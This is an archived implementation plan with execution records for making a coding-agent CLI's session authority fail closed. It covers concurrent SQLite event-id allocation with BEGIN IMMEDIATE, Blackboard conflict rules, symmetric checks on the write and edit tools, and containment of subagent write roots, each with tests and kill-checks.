> **Status:** archived 2026-08-25 — moved from implementation-plans per 30-day rule

# PLAN: S5 — Authority Correctness and Mutation Safety

Plan-ID: `PLAN-cli-trace-S5-authority-correctness`

Status: **COMPLETE — merged as `57f574a`** (+ CI follow-up `211e8fb`), 2026-07-28.
All seven implementation steps landed with execution records in §5; DoD verified
in §8. **One item remains OPEN by decision: Q19 / V24 / V25** (subagent
containment), carried as a strict `xfail` and tracked in
[`BACKLOG.md` §I-34](../../knowledge/BACKLOG.md#i-34--subagent-containment-os-level-writable-mount-boundary-q19--v24v25).

Post-merge review: **2026-07-29** (§13). Verdict **PASS** — all six parent
kill-checks re-measured and biting; three defects found and closed here.

> **Reading this plan after the merge.** §1–§4 describe the *pre-S5* tree, and
> their `file:line` anchors have since drifted (S6/S6.6 edits moved
> `state.py` by ~+59 lines). Anchors are preserved as the historical record;
> **§13.3 carries the re-resolved current locations.** Per the plan-authoring
> staleness rule, re-grep before trusting any line number here.

Depth: **P2** — cross-module runtime change to the session authority, the
Blackboard conflict contract, and the subagent isolation boundary.

Revision: **v2** — closes 11 parent-trajectory gaps, 2 SQLite logic errors, and
4 missing §13 protocol sections found in review.

Parent plan:
`worklogs/implementation-plans/cli-trace-substrate-rebaseline-2026-07-25.md` §Step S5

Prior evidence:

- `worklogs/implementation-plans/cli-trace-S2-verification-report.md`
- `worklogs/implementation-plans/cli-trace-substrate-liveness-audit-2026-07-25.md` (S3)
- `worklogs/implementation-plans/cli-trace-S4-verification-report.md` (S4)

---

## 0. Scope and execution boundary

### IDEA

S2 wired the session authority. S3 audited it. S4 proved on the deployed
container which holes are real. S5 closes them — and only them.

The unifying defect class is **fail-open under contention or failure**: an id
allocator that collides, a counter that counts uncommitted work, a conflict
check that expires after a commit, an edit tool that skips the check entirely,
and an isolation boundary that degrades to the main workspace when it breaks.
Each currently reports success while the guarantee it names is absent.

### CONCRETE INTENT

```text
V1      concurrent runs must not allocate duplicate event ids
V2res   kind_counts must not count an event whose write failed
V6      Blackboard duplicate-id semantics must be explicit, not INSERT OR REPLACE
V15/V17 edit_file must obey the same pre-write conflict contract as write_file
S3-F10  a commit must not silently disable conflict detection
S3-F13  agent-facing observability tools must read the authority, not the mirror
V18/V19 worktree isolation failure must deny, not fall back to the main workspace
V20     subagent cleanup failure must not be swallowed behind a success result
V21/V22 the spawn limit must be one atomic admission decision
V24/V25 gate and executor must share one write root
```

Plus the parent-mandated obligations that are **currently code-correct but
regression-unprotected** (§1.2): they get tests, not rewrites.

### GOALS

- **S5-G1** — event identity is database-serialized and unique under concurrency.
- **S5-G2** — in-memory counters never lead the authoritative commit.
- **S5-G3** — the Blackboard conflict contract holds across commits and across
  both mutating tools.
- **S5-G4** — every authority read on an agent-facing path is injected and
  fail-closed.
- **S5-G5** — worktree/subagent failures deny rather than degrade.
- **S5-G6** — every change carries a producer kill-check that fails when the
  production call site is removed.
- **S5-G7** — S2-closed invariants gain regression tests so they cannot silently
  reopen (parent exit criteria that have code but no test).

### NON-GOALS

- No contract-checker edits (S3-F1/F2/F3/F14 — separate approved subplan).
- No `EventBus` in `loop.py`. **Q12 is resolved** as an exemption recorded at
  `src/fa/output.py` §Console-mirror kinds; the caller-side emit stays with S6.
- No V23 (live EventBus redaction) — deferred by operator decision.
- No S4-F1 (`inner-loop-smoke` second `session.db`) — owner S6.
- No CLI extraction (S10), no Codacy complexity refactor.
- No telemetry/global-history migration.
- No deployment or image rebuild; S5 verifies locally, S7/S11 deploy.

### SIZE

Scope by files touched (parent §Industry-proven rules #2): **9 production files
+ ~8 test files across 6 steps.** No single step exceeds 3 production files.

### STOP RULE

Stop and promote a `Q13+` if closing an item requires choosing a product policy
rather than applying an agreed one — specifically if:

- a fix would change the accepted session/run identity model;
- append-only versus versioned-update for the Blackboard contradicts **ADR-16
  I-6.2/I-6.3** (**Q13** — see §11; the plan previously cited ADR-14/15, which
  do not carry this invariant);
- denying a worktree failure would break an accepted subagent use case (**Q11-B**);
- the event-id migration requires a decision beyond the §3.1 default (**Q14**).

---

## 1. Preflight — source-verified current state

Line numbers were read against the S4 report §1.2 hashes. **Step S5.0
re-verifies every one before any edit; drift is a stop condition.**

### 1.1 Defect sites (to be changed)

| # | Site | Current behaviour |
|---|---|---|
| 1 | `state.py:171` `_next_id = self._initial_next_id(...)` | seeds from `event_count() + 1` at construction, never refreshed |
| 2 | `session_db.py:168` `id INTEGER PRIMARY KEY AUTOINCREMENT` | a serialization point already exists, unused for `event_id` |
| 3 | `session_db.py:167-180` `event_log` DDL | **no uniqueness on `event_id`** — duplicates persist silently |
| 4 | `state.py:210` `kind_counts[...] += 1` | increments **before** `append_event_row` at `:213` |
| 5 | `coder_loop.py:573-574` | persists `dict(log.kind_counts)` into `session_meta` — the drift becomes durable |
| 6 | `session_db.py:470,495` | Blackboard rows written with `INSERT OR REPLACE` |
| 7 | `session_db.py:672` | `session_meta` `INSERT OR REPLACE` — **intentional** last-write-wins, do not touch |
| 8 | `blackboard.py:94` `_should_check_conflict` | `return new_base == old_base`; differing `base_commit` ⇒ skipped |
| 9 | `tools/edit_file.py` handler | `write_text` then `_write_blackboard_entry`; **no conflict check at all** |
| 10 | `tools/write_file.py:196` *(pre-S5; the check now lives in `mutation_guard.check_mutation_allowed`, `mutation_guard.py:130` — §13.3)* | `_check_conflict` before write — the correct shape |
| 11 | `tools/write_file.py:51,69,78,111` | four `return None` paths meaning "allow the write" on root mismatch / Blackboard error |
| 12 | `tools/observability.py:42` | `EventLog(path, run_id=run_id)` with **no `session_db`** ⇒ mirror fallback live |
| 13 | `state.py:514-516` | `create_subagent_workspace` returns `self.workspace_root` on manager failure |
| 14 | `worktree_manager.py:234-239` | `mode == "isolated"` logs a warning, returns `SharedDir` |
| 15 | `state.py:518-523` | `cleanup_subagent_workspace` logs and returns |
| 16 | `subagent_runner.py:109-116` | increment failure caught, guard returns success |
| 17 | `subagent_runner.py:101-116` | read → compare → separate increment (non-atomic) |
| 18 | `subagent_runner.py` `run_stateless` | `subprocess.run(..., shell=True)`; `SandboxHook` evaluates against the parent `workspace_root` |

### 1.2 S2-closed invariants — code correct, regression-unprotected

Parent exit criteria that S3/S4 confirmed *already fixed*. S5 must **not**
re-open them; it must **pin** them (S5-G7). Verified present:

| Invariant | Code site | Existing test | S5 action |
|---|---|---|---|
| mismatched explicit `session_db` rejected | `state.py:157-161` | `test_session_db_authority.py` | assert kept |
| **EventLog and Blackboard share one authority** | `state.py:358-361` (path-identity check) + `:417` (Blackboard disabled when the authority is unavailable) | none direct | **add C1** |
| run-id reuse rejected | `manager.py:394,401` | `test_session_lifecycle.py` | assert kept |
| run-scoped reads | `state.py:245` | `test_cli.py:991-992` | **strengthen** — see S5.0 |
| stats no DB-creation side effect | `stats.py:289` `open_existing` | S4.6 deployed proof | **add local C1** |
| clean-cutover legacy rejection | `cli.py:2483` `legacy_unsupported` | **none found** | **add C3** |
| mirror failure does not create mirror-ahead state | `state.py:192-198` | none direct | **add C3** |

### 1.3 Reproductions carried in

| Finding | Repro | Result |
|---|---|---|
| V1 | barrier-synchronised concurrent `SessionManager → begin_run → EventLog` | **6 duplicate ids** |
| V2res | forced `append_event_row` failure | `kind_counts={'tool_call':1}`, `_next_id=1`, 0 DB rows |
| V15 | same Blackboard state through both tools | `write_file` denied, `edit_file` mutated |
| S3-F10 | agent B blocked at HEAD₁ → commit → agent C **allowed** | bypass confirmed |
| S3-F13 | forged mirror row, empty authority | agent tool reported a run that never happened |
| V18/V20/V21/V22 | forced manager/counter failures | all fail-open, probed |

**V1's repro requires a barrier.** Two concurrent processes started naturally
produced **0** duplicates — startup jitter serialized them. A concurrency test
without an explicit synchronisation point passes by accident and is vacuous.

---

## 2. Current state → target state

| Dimension | AS-IS | TO-BE |
|---|---|---|
| Event id allocation | per-instance `COUNT(*)+1`, no constraint | DB-serialized; `UNIQUE(session_id, event_id)` enforced |
| Existing DBs | no constraint, may already hold duplicates | explicit migration decision (§3.1), never a silent no-op |
| Counter ordering | increments before commit; drift persisted | increments only after the commit succeeds |
| Blackboard writes | `INSERT OR REPLACE` | explicit append-only or versioned update; duplicate id is a named outcome |
| Conflict scope | skipped when `base_commit` differs | differing base does not disable detection |
| Mutating tools | `write_file` checks, `edit_file` does not | both share one pre-write contract |
| Conflict failure mode | root mismatch / Blackboard error ⇒ allow | ⇒ deny with structured `ToolResult.fail` |
| Agent observability reads | non-injected ⇒ mirror fallback | injected authority; fail-closed |
| Worktree isolation failure | returns main workspace | denies |
| `worktree_mode=isolated` | warning + SharedDir | rejected at config load |
| Subagent cleanup failure | swallowed | surfaced; result reflects it |
| Spawn limit | check-then-act, best-effort increment | one atomic admission |
| Subagent write root | gate parent root, executor `workdir` | one shared artifact-only root |

---

## 3. Contracts

### S5-CT1 — Event identity

**PRE:** any number of `EventLog` instances may target one `session.db`.
**POST:** every persisted `event_id` is unique **within its session**;
concurrent appends never collide.
**ERROR:** allocation failure raises; it never returns a duplicate.
**KILL-CHECK:** restore `COUNT(*) + 1` seeding → the barrier concurrency test
fails. Drop the uniqueness index → the duplicate-persistence test fails.

#### 3.1 Two SQLite facts that constrain the design (verified in review)

Both were proven with live SQLite during plan review; ignoring either produces
a fix that silently does nothing or bricks a session.

**(a) The constraint must be `UNIQUE(session_id, event_id)`, not `UNIQUE(event_id)`.**
`event_id` is only unique per session (`ev-000001` legitimately exists in every
session). A bare `UNIQUE(event_id)` rejects a valid row in a *different*
session:

```text
UNIQUE(event_id)             -> rejects ev-000001 in session s2   WRONG
UNIQUE(session_id, event_id) -> s2 accepted; duplicate in s1 rejected   CORRECT
```

**(b) Adding the constraint to `CREATE TABLE IF NOT EXISTS` does NOT protect
existing databases** — the DDL is a no-op when the table exists. Proven:

```text
old table created -> new DDL with UNIQUE applied -> duplicate INSERT ACCEPTED
```

And a `CREATE UNIQUE INDEX` on a DB that **already contains** V1 duplicates
raises `IntegrityError: UNIQUE constraint failed`, i.e. the session would fail
to open after upgrade.

**(c) The constraint alone is not the fix — it converts corruption into DATA
LOSS.** Proven in review: with `UNIQUE(session_id, event_id)` in place and two
threads racing on the same id, one INSERT succeeds and the other raises
`IntegrityError`. If the allocator does not allocate *inside* the same
serialized transaction as the insert, **the losing writer's event is silently
dropped** — a strictly worse failure than a duplicate id, because the event
vanishes from the audit trail.

```text
constraint only          : 2 attempted -> 1 persisted, 1 IntegrityError (event LOST)
allocate-inside-txn      : 20 attempted -> 20 persisted, 0 duplicates, 0 lost
```

**(d) An in-process lock is NOT sufficient — it does not span processes.**
The v2 wording said "serialized transaction under the existing `_write_lock`".
`threading.Lock` is process-local, and the production shape is *separate
processes* (`docker compose exec … fa run`, per S4.4). Measured across 5 trials,
6 processes × 5 appends:

```text
app-lock  (threading.Lock + DEFERRED `with conn:`)  lost  6 / 150   UNSAFE
BEGIN IMMEDIATE                                     lost  0 / 150   SAFE
rowid-derived id (INSERT then derive from lastrowid) lost 0 / 150   SAFE
```

The app-lock variant silently drops events across processes. It passes an
in-process thread test, which is exactly why the S5-P21 no-loss test **must**
use processes, not only threads (§6.0).

**Mandatory design — `BEGIN IMMEDIATE` for every write transaction.**

This is the documented SQLite remedy, not an invention. In DEFERRED mode (the
`sqlite3` default, and what `with conn:` uses today at
`session_db.py:164,280,324,466,670,703`) a transaction takes a *read* lock
first and upgrades on the first write. If another writer holds the write lock,
the upgrade returns `SQLITE_BUSY` **immediately, without honouring
`busy_timeout`**, because waiting would deadlock. Industry consensus calls this
"SQLite's single biggest footgun"; Rails changed its SQLite adapter to default
to IMMEDIATE for exactly this reason.

Requirements for `SessionDatabase` write paths:

1. Open write transactions with `BEGIN IMMEDIATE`, not bare `with conn:`.
2. Keep `PRAGMA busy_timeout` (already set, `_sqlite_common.py:50`) — it makes
   contenders wait rather than fail.
3. Allocate the id **inside** that same transaction.
4. Wrap the transaction in a bounded retry on `SQLITE_BUSY`, because
   `BEGIN IMMEDIATE` + `busy_timeout` reduces but does not fully eliminate it
   under sustained contention. Retries must be bounded and the exhaustion case
   must raise `SessionDatabaseError`, never silently drop the event.
5. Do **not** widen write transactions — one writer at a time is a SQLite
   invariant; long write transactions convert contention into timeouts.

The `UNIQUE(session_id, event_id)` constraint is a **backstop that must never
fire in normal operation**. If it fires at runtime the allocator is broken; that
condition must raise, not be swallowed. A test asserting the constraint fires
during concurrent appends is asserting a bug.

**Q14 — migration policy for pre-existing duplicates. Default (adopt unless
overridden):** on open, attempt `CREATE UNIQUE INDEX IF NOT EXISTS`; on
`IntegrityError`, fail closed with a structured `SessionDatabaseError`
(`event_id_duplicates_present`) naming the session and the duplicate count, and
do **not** silently continue. Rationale: a session whose ids already collide has
an ambiguous replay history; Q2's clean-cutover policy says surface it as
unsupported rather than repair it. **This is a policy choice — confirm before
S5.1 or raise Q14.**

The operator's live box has at least one un-audited candidate
(`session-ee9d886…` from the pre-S4 experiment); S5.0 must check it.

### 3.2 Q11-B — artifact-only two-root subagent policy (specified for S5.6)

Parent §Q11 selected the *direction* (two-root sandbox) but never specified it.
Current code has no artifact root at all: `SharedDirWorktreeManager
.create_subagent_workspace` returns `self.session_root` verbatim
(`worktree_manager.py:84-86`), and `SandboxHook` routes `fs_spawn_subagent`
through the same bash evaluator as `fs_run_bash` against the parent
`workspace_root` (`hooks/builtin.py:73,112-113`). So today the subagent's write
root **is** the main workspace, and V24/V25 are two faces of that.

Three specifications were considered.

| Option | Write root | Enforcement | Pros | Cons |
|---|---|---|---|---|
| **A — artifact dir under the session** `<session>/.fa/subagents/<task_id>/` | one dir per task, inside the session workspace | `SandboxHook` evaluates spawn against the task dir, not `workspace_root`; runner `cwd` = same dir | no new mount/topology; survives with `SharedDir`; cleanup is `rm -rf` of one dir; read root stays the session so the subagent can *read* the repo | the artifact dir lives inside the repo tree, so a careless `git add -A` in the parent could commit it (mitigated: `.fa/*` is now gitignored — S4-F2) |
| **B — artifact dir outside the workspace** `~/.fa/sessions/<sid>/subagents/<task_id>/` | one dir per task, in state root | same | cannot pollute the repo tree at all; sits with the other session state | subagent output is no longer adjacent to the code it describes; needs a path passed into the tool contract; a read-root/write-root split across two filesystems complicates `cwd` semantics |
| **C — real git worktree per task** | `IsolatedWorktreeManager` | worktree isolation | genuine isolation; enables future code-editing subagents | ADR-15 explicitly defers isolated mode; needs branch lifecycle, cleanup on crash, and disk per task. This is the mode `from_flags` currently refuses (V19) |

**Recommendation: Option A**, with C named as the future upgrade path.

Rationale for this project specifically:

1. **It matches the accepted v0.1 scope.** ADR-16 §Pair-over-Autonomy I-7.x
   frames subagents as "cheap deterministic puzzle piece when main 180k near
   limit" — reports and test output, not code editing. Option A is the minimum
   substrate that makes artifact-only *true*; B and C both buy isolation the
   accepted use case does not need yet.
2. **It is subtraction-compatible** (project-overview §1.2). A adds one
   directory convention and one path argument. C adds a lifecycle subsystem.
3. **It closes V24/V25 with one mechanism.** Both the gate and the executor take
   the same `task_artifact_root`; the current defect is precisely that they
   disagree. One shared value, computed once, is a compliance-by-construction
   fix (§1.2.5) rather than a second guard.
4. **The repo-pollution objection is now moot.** It was the strongest argument
   for B, and S4-F2 fixed `.gitignore` so `.fa/*` is excluded.
5. **It does not foreclose C.** The write root becomes a parameter; swapping in
   a worktree path later is a factory change, not a contract change.

Specification adopted for S5.6:

```text
read root  : the session workspace (unchanged) — subagent may READ the repo
write root : <session_workspace>/.fa/subagents/<sanitized_task_id>/
             created before spawn; the ONLY writable path
enforcement: SandboxHook evaluates fs_spawn_subagent against write root,
             not workspace_root (closes V25)
executor   : SubagentRunner cwd = the same write root (closes V24)
             the value is computed once and passed to both (single source)
failure    : if the write root cannot be created -> deny the spawn
             (closes V18: never fall back to workspace_root)
cleanup    : remove the task dir; failure is surfaced, not swallowed (V20)
isolated   : `worktree_mode=isolated` is rejected at config load (V19);
             Option C remains the documented upgrade path
```

**Q11-B is settled for S5.6 on this specification.** If implementation shows the
gate and executor cannot share one value without a wider refactor, stop and
raise Q15 rather than re-introducing two roots.

### S5-CT2 — Counter ordering

**PRE:** an append may fail at the authority.
**POST:** `kind_counts` and any derived rollup reflect only committed events.
**KILL-CHECK:** move the increment back above the write → the failed-append
metric test fails. Must also assert the **consumer** (`coder_loop.py:573`) never
persists a drifted count into `session_meta`.

### S5-CT3 — Blackboard mutation contract

**PRE:** two writers may target the same path, with equal or differing
`base_commit`.
**POST:** a genuine write/write overlap is denied regardless of an intervening
commit; duplicate ids follow one explicit documented rule.
**KILL-CHECK:** restore `INSERT OR REPLACE` → the duplicate-id test fails.
Restore the `base_commit` equality short-circuit → the S3-F10 bypass test fails.

### S5-CT4 — Mutating-tool symmetry

**PRE:** a conflicting Blackboard entry exists for the target path.
**POST:** `write_file` and `edit_file` behave identically: deny before mutation.
**ERROR:** root mismatch or Blackboard failure ⇒ `ToolResult.fail`, not a write.
**KILL-CHECK:** remove the `edit_file` check → the symmetry test fails. The test
must run **both** tools through one parametrised case so they cannot drift.

### S5-CT5 — Authority reads on agent-facing paths

**PRE:** a session has an authoritative DB and a possibly-stale JSONL mirror.
**POST:** `fs_chronicle_search` / `fs_usage` / `fs_list_tasks` read the injected
authority; a read failure surfaces, never substitutes the mirror.
**KILL-CHECK:** forge a mirror row with an empty authority → the tool reports
nothing; the test fails if it reports the forged event.

### S5-CT6 — Isolation boundary

**PRE:** worktree creation, cleanup, or the spawn counter may fail.
**POST:** each failure denies with a structured error; no path returns the main
workspace as a fallback write root.
**KILL-CHECK:** restore `return self.workspace_root` (`state.py:516`) → the containment test fails.

### S5-CT7 — S2 invariant regression pins (S5-G7)

**POST:** each §1.2 row has a test that fails if the invariant regresses.
**KILL-CHECK:** revert the S2 fix in a disposable copy → the pin fails.

---

## 4. Path and flag matrix

| ID | Path | Root | Class | Kill-check |
|---|---|---|---|---|
| S5-P1 | concurrent runs, one session | `SessionManager → begin_run → EventLog` | C1 + barrier | restore `COUNT(*)+1` |
| S5-P2 | sequential runs, one session | same | C1 | regression guard for the S4.4 shape |
| S5-P3 | authority write failure | `EventLog.append` | C3 | move counter before write |
| S5-P4 | mirror write failure (no mirror-ahead) | `EventLog.append` | C3 | DB must stay correct |
| S5-P5 | same-base conflict | `write_file` | C1 | — |
| S5-P6 | **cross-commit conflict** | `write_file` | C1 | restore base equality |
| S5-P7 | conflict via `edit_file` | `edit_file` | C1 | remove the check |
| S5-P8 | Blackboard root mismatch (+ positive case) | both tools | C3 | restore `return None` |
| S5-P9 | Blackboard duplicate id | `session_db` | C1 | restore `INSERT OR REPLACE` |
| S5-P10 | agent tool vs forged mirror | `tools/observability.py` | C1 | remove injection |
| S5-P11 | worktree creation failure | `SessionState` | C3 | restore fallback |
| S5-P12 | `worktree_mode=isolated` | `WorktreeManagerFactory` | C0 | restore downgrade |
| S5-P13 | cleanup failure | `SessionState` | C3 | restore swallow |
| S5-P14 | spawn-limit counter failure | `SubagentRunner` | C3 | restore best-effort |
| S5-P15 | concurrent spawn admission | `SubagentRunner` | C1 + barrier | restore check-then-act |
| S5-P16 | subagent write outside artifact root | `SandboxHook` + runner | C3 | restore parent-root eval |
| S5-P17 | **pre-existing duplicate DB on open** | `SessionDatabase.__init__` | C3 | remove the migration guard |
| S5-P18 | **legacy DB clean-cutover rejection** | `cli.py` stats discovery | C3 | restore a legacy reader |
| S5-P19 | **stats creates no DB during read** | `parse_session_db` | C1 | swap in creating constructor |
| S5-P20 | **EventLog/Blackboard authority identity** | `SessionState.__post_init__` | C1 | remove the path-identity check at `state.py:361` |
| S5-P21 | **no event lost under concurrent append (threads)** | `EventLog.append` | C1 + barrier | move allocation outside the insert transaction |
| S5-P22 | **no event lost across PROCESSES** | `EventLog.append` | C1 + multiprocess barrier | replace `BEGIN IMMEDIATE` with an in-process lock |
| S5-P23 | **FA_STATE_ROOT honoured end to end** | entrypoint + `_cmd_run` | C2 | revert `cli.py:128` to `Path.home()` |
| S5-P24 | **blackboard_enabled=False still permits writes** | both tools | C1 | make the disabled path deny |
| S5-P25 | **denial names the failed precondition** | both tools | C3 | collapse the errors into one generic code |

Every row needs a named test. A row without an oracle is not covered.

---

## 5. Execution order

Incremental: **land each step behind its own tests before starting the next.**
A stop in a later step must not leave an earlier one half-applied.

Each step below states: intent · mechanism · production rationale · failure
behaviour · files · concrete test names · exit criteria (parent §13 shape).

### Step S5.0 — Preflight re-verification (no production edits)

**Intent.** Confirm §1 is still true and settle the two blocking defaults.

Do:

1. Re-read every §1.1 line citation; any drift is a stop condition.
2. Run the existing S2 pins (`test_session_db_authority.py`,
   `test_session_lifecycle.py`) and record green.
3. **Audit real session DBs for pre-existing `event_id` duplicates** — locally
   and, via the operator, on `fa-HP` (`session-ee9d886…` is un-audited). The
   result decides whether Q14's fail-closed default is acceptable.
4. Record the ADR-16 §I-6.2/I-6.3 citation (`knowledge/adr/DIGEST.md:733`) that
   settles Q13 as append-only; no decision remains.
5. Confirm the box is in the clean state Q14 assumes (no pre-existing session
   state). If duplicates are found anyway, stop — do not write repair code.

Exit:

- [ ] all §1.1 citations re-verified or plan amended;
- [ ] duplicate-audit result recorded for every reachable session DB;
- [ ] clean-state precondition for Q14 confirmed;
- [ ] ADR-16 citation for Q13 recorded.

### Step S5.1 — Event identity (V1)

**Intent.** Make event ids unique under concurrency.
**Mechanism.** Allocate inside the same serialized transaction that inserts the
row (§3.1c — allocation and insert must not be separable, or concurrent writers
lose events), using the existing `id INTEGER PRIMARY KEY AUTOINCREMENT` as the
serialization point;
add `UNIQUE(session_id, event_id)` per §3.1(a); apply to existing DBs via
`CREATE UNIQUE INDEX IF NOT EXISTS` per §3.1(b).
**Production rationale.** Duplicate correlation ids corrupt replay exactly when
multiple runs share a session — the workflow shape S4.4 proved is supported.
**Failure behaviour.** Allocation failure raises `SessionDatabaseError`; a DB
holding pre-existing duplicates fails closed with `event_id_duplicates_present`
(Q14).

Files: `session_db.py`, `state.py`.

Tests (`tests/test_s5_event_identity.py`, NEW):

- `test_concurrent_runs_allocate_unique_event_ids` — C1 + barrier (S5-P1)
- `test_sequential_runs_allocate_unique_event_ids` — C1 (S5-P2)
- `test_duplicate_event_id_rejected_by_constraint` — C0 DDL (S5-P1)
- `test_existing_db_gains_unique_index_on_open` — C3 (§3.1b)
- `test_db_with_preexisting_duplicates_fails_closed` — C3 (S5-P17)
- `test_concurrent_appends_lose_no_events` — C1 + barrier (S5-P21) — **assert
  every attempted append is persisted, not merely that ids are unique.** The
  constraint must never be what stops a duplicate at runtime.
- `test_concurrent_appends_across_processes_lose_no_events` — C1 + multiprocess
  barrier (S5-P22) — **required**: an in-process lock passes the thread test and
  still loses events across processes (§3.1d measured 6/150 lost). Threads alone
  cannot falsify the app-lock design.

Exit:

- [ ] barrier test green and **fails** when `COUNT(*)+1` is restored;
- [ ] **no-loss test green (threads)**: N concurrent appends ⇒ N persisted rows,
      0 duplicates, 0 `IntegrityError` escapes (§3.1c);
- [ ] **no-loss test green (processes)**: same invariant across ≥4 processes;
      fails if the allocator relies on an in-process lock (§3.1d);
- [ ] write transactions use `BEGIN IMMEDIATE` with bounded `SQLITE_BUSY` retry;
      retry exhaustion raises, never drops an event;
- [ ] index present on a DB created *before* this change;
- [ ] pre-existing-duplicate DB fails closed with the named error;
- [ ] `ev-NNNNNN` public form preserved (Q6) or the change documented.

### Step S5.2 — Counter ordering (V2 residual)

**Intent.** Counters must not count uncommitted events.
**Mechanism.** Move the `kind_counts` increment below the authoritative write in
`EventLog.append`; assert the `coder_loop.py:573` rollup consumes only committed
counts.
**Production rationale.** S3 proved the drift is *persisted* into
`session_meta`, so a failed append durably corrupts guardrail metrics.
**Failure behaviour.** On append failure, counters are unchanged and the
exception propagates.

Files: `state.py` (+ assertion against `coder_loop.py`).

Tests (`tests/test_s5_counter_ordering.py`, NEW):

- `test_kind_counts_unchanged_when_authority_write_fails` — C3 (S5-P3)
- `test_rollup_never_persists_uncommitted_counts` — C1 (S5-P3)
- `test_mirror_failure_leaves_db_authoritative` — C3 (S5-P4, §1.2 pin)

Exit:

- [ ] counter test fails when the increment is moved back above the write;
- [ ] no `session_meta` rollup reflects a failed append;
- [ ] mirror-ahead state is impossible.

#### S5.0 execution record — 2026-07-28

- §1.1 citations re-verified; 2 benign drifts corrected (`state.py` line shift
  from the S3.5 `TraceEvent.from_row` addition; defects unchanged).
- S2 pins green: `test_session_db_authority.py` + `test_session_lifecycle.py`
  — 18 passed.
- Duplicate audit, 10 local session DBs: **0 duplicate groups**. Q14's
  fail-closed default costs nothing on this box.
- Q13 citation recorded verbatim from `knowledge/adr/DIGEST.md:733`:
  *"blackboard append-only content-hashed queryable detect_conflict()"* and
  *"no silent overwrite → fail code conflict_detected"*.

#### S5.1 + S5.2 execution record — 2026-07-28

Status: **LANDED.** Tests written first and observed failing before any
production edit (4 failed / 1 passed — the 1 pass was the sequential regression
guard, which is structurally guaranteed and never evidence of a fix).

Mechanism: `SessionDatabase.append_event_row_allocating` allocates the id and
inserts the row inside one `BEGIN IMMEDIATE` transaction with bounded
`SQLITE_BUSY` retry; `EventLog.append` now passes `event_id=""` so the instance
cannot express an opinion about identity. `_next_id` retained as a diagnostic
(parent Do#9) and documented as no longer the allocator.
`_enforce_event_id_uniqueness` adds `ux_event_log_session_event` via
`CREATE UNIQUE INDEX IF NOT EXISTS`, so pre-S5 databases gain the guarantee on
next open; a DB already holding duplicates fails closed with
`event_id_duplicates_present` (Q14). S5.2 landed in the same edit because both
defects live in `EventLog.append`: `kind_counts` now increments only after the
authoritative commit.

Kill-checks, both executed in disposable copies:

```text
KC1  restore per-instance COUNT(*)+1 allocation
     -> 3 failed (concurrent-unique, no-loss threads, no-loss processes)

KC2  keep UNIQUE constraint, move allocation outside the transaction
     ("the plausible wrong fix")
     -> test_concurrent_appends_lose_no_events FAILS with 15 of 20 events
        dropped: "event_log_write_failed: UNIQUE constraint failed"
```

KC2 is the one that matters: uniqueness still held, and only the no-loss
assertion caught the regression. Without S5-P21/P22 that fix would have shipped.

Gate: pytest **2020 passed, 14 skipped** · mypy strict clean (137 files) ·
pylint 10.00/10 · ruff clean (2 pre-existing RUF100 in untouched
`hooks/base.py`) · ruff format clean · producer/consumer PASS ·
no-mocked-dataclasses PASS · authoring-check 0 diagnostics.

Remaining: S5.3–S5.6.

### Step S5.3 — Blackboard contract (V6, S3-F10)

**Intent.** Conflict detection must not expire, and duplicate ids must be explicit.
**Mechanism.** Replace `INSERT OR REPLACE` on the **`blackboard` table only**
(`session_db.py:470,495`); fix `_should_check_conflict` so a differing
`base_commit` no longer short-circuits detection.
**Production rationale.** S3-F10 proved one commit disables the formal guarantee
against every pre-commit entry; coding agents commit routinely.
**Failure behaviour.** Overlap ⇒ `conflict_detected`; duplicate id ⇒ the Q13 rule.

Files: `session_db.py`, `blackboard.py`.
**Do-not:** `session_meta:672` `INSERT OR REPLACE` is intentional
last-write-wins and must remain (risk S5-R6).

Tests (`tests/test_s5_blackboard_contract.py`, NEW):

- `test_same_base_commit_conflict_denied` — C1 (S5-P5)
- `test_conflict_denied_across_intervening_commit` — C1 (S5-P6)
- `test_blackboard_duplicate_id_semantics_explicit` — C1 (S5-P9)
- `test_session_meta_last_write_wins_unchanged` — C0 regression guard

Exit:

- [ ] cross-commit bypass closed and its test fails on revert;
- [ ] duplicate-id rule documented in-code and tested;
- [ ] `session_meta` semantics unchanged.

#### S5.3 execution record — 2026-07-28

Status: **COMPLETE.** Q16 resolved systemically during the step; Q17 raised and
scoped out (hygiene-only, non-blocking).

Tests written first, observed failing: 2 failed / 5 passed. The 5 passes were
deliberate guards (same-base conflict, parent_id chain, disjoint write_sets,
session_meta, raw-SQL backstop) — they confirm the fix does not over-reject.

Edit 1 — `blackboard.py::_should_check_conflict` reduced to
`return new.parent_id != old.id`. The `base_commit` equality short-circuit is
removed: a differing base means *later*, not *safe*. Divergent bases remain
reported via `_assumption_violated`, which is where that signal belongs.

Edit 2 — both `INSERT OR REPLACE INTO blackboard` became plain `INSERT`
(`id` is already the table PRIMARY KEY, so the integrity backstop is free), and
`sqlite3.IntegrityError` is translated into `SessionDatabaseError`
`blackboard_duplicate_id` with remediation text. `session_meta` (now the sole
remaining `INSERT OR REPLACE`, line 870) is untouched — S5-R6 guard test pins it.

Kill-checks, both in disposable copies:

```text
KC-A  restore the base_commit short-circuit
      -> test_conflict_denied_across_intervening_commit FAILS
KC-B  restore INSERT OR REPLACE on both blackboard writes
      -> test_blackboard_duplicate_id_semantics_explicit FAILS
```

Each revert fails exactly its own test and nothing else.

Gate: pytest **2027 passed, 14 skipped** (clean state) · mypy strict clean ·
pylint 10.00/10 · ruff + format clean on changed files.

**Q16 raised — see §11.** The append-only change surfaced a pre-existing CT11
violation: `test_write_file_conflict_uses_per_run_blackboard_authority` writes
into the shared `~/.fa/session-log/run-1/` instead of `tmp_path`, so it passes
once and fails on every rerun. `INSERT OR REPLACE` had been masking it. Per the
§0 stop rule this is a policy choice (test edit vs runtime change vs defer) and
is promoted rather than decided unilaterally.

Edit 3 (Q16 resolution, V10) — `default_state_root()` added to `state.py` and
used at the single production consumer; module constant retained (Do#9). New
`tests/conftest.py` autouse fixture redirects that one seam per test.

The one-line test fix I first recommended was investigated and **rejected**: the
scan found ten tests with the same shape and eight matching leaked directories,
so it would have fixed one of ten. A `HOME` monkeypatch was measured and also
rejected — V10's import-time binding defeats it. Fixing V10 itself closes the
class. Scope was then tightened once: patching `Path.home` globally broke 25
tests that legitimately assert home-relative constants.

```text
KC-C  revert call-time resolution to the import-time constant
      -> run 1: 10 passed   run 2: 1 FAILED
      (the pass-once-fail-after signature returns; the fix is load-bearing)
```

Exit criteria:

- [x] cross-commit bypass closed and its test fails on revert (KC-A);
- [x] duplicate-id rule documented in-code and tested (KC-B);
- [x] `session_meta` semantics unchanged (guard test green);
